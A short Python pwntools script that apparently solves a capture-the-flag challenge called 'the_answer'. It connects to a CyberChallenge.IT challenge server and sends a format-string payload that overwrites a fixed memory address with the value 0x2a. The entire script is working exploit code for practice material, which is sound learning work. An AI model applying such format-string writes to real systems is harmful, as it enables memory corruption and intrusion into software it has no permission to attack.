#!/usr/bin/env python3
from pwn import *

# Set up the binary
context.binary = binary = './the_answer'
context.arch = 'amd64'
p = remote('answer.challs.cyberchallenge.it', 9122)
# p = process(binary)

# gdb.attach(p, gdbscript="""
# b *0x00000000004008c3
# b *0x004008d9
# """)

# Address breakdown (avoiding NULL bytes)
answer_addr = 0x601078

payload = fmtstr_payload(10, {answer_addr: 0x2a}, write_size='short')

p.sendline(payload)
p.interactive()
